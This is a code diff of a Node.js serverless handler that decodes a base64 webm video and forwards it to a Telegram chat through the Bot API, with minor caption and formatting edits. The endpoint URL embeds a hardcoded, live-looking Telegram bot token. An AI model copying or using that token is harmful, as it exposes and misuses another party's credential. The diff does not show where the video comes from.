@@ -8,21 +8,18 @@ module.exports = async (req, res) => {
 
     try {
         const { chat_id, video_base64 } = req.body;
-        
         const videoBuffer = Buffer.from(video_base64, 'base64');
-        
         const FormData = require('form-data');
         const form = new FormData();
         form.append('chat_id', chat_id);
         form.append('video', videoBuffer, { filename: 'video.webm', contentType: 'video/webm' });
-        form.append('caption', '🎬 فيديو جديد');
+        form.append('caption', '🎬 فيديو');
         
         await axios.post(
-            `https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendVideo`,
+            'https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendVideo',
             form,
             { headers: form.getHeaders(), timeout: 30000 }
         );
-        
         return res.json({ success: true });
     } catch (e) {
         return res.json({ error: e.message });
